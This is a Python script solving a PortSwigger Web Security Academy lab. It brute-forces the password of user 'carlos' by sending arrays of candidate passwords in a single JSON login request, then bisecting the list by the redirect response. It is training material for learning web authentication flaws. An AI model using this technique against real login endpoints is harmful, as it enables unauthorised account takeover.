#!/usr/bin/python

import json

import requests

# https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

URL = "https://ac671f301e1cad41800b16e5007b004e.web-security-academy.net/login"


def is_valid_pass(params):
    res = requests.post(URL, json=params, allow_redirects=False)
    #  print(params)
    #  print(res.text)
    return res.status_code == 302


def start_guessing(passwords: list):
    if len(passwords) == 1:
        return passwords
    params = {"username": "carlos", "password": passwords}
    #  print(passwords)
    if is_valid_pass(params):
        half = int(len(passwords) / 2)
        part1 = start_guessing(passwords[:half])
        if part1 is None:
            return start_guessing(passwords[half:])
        return part1

    else:
        return None


def brute_passwords():
    passwords_payload = []
    with open("passwords") as passwords:
        while True:
            line = passwords.readline()
            if not line:
                break
            line = line[:-1]
            passwords_payload.append(line)
            #  params = {"username": line, "password": "sadfasdf"}
            #  r = pool.apply_async(is_valid_payload, (params, ))
            #  threads.append(r)
            #  r.get()
        result = start_guessing(passwords_payload)
        print("password is", result)


brute_passwords()
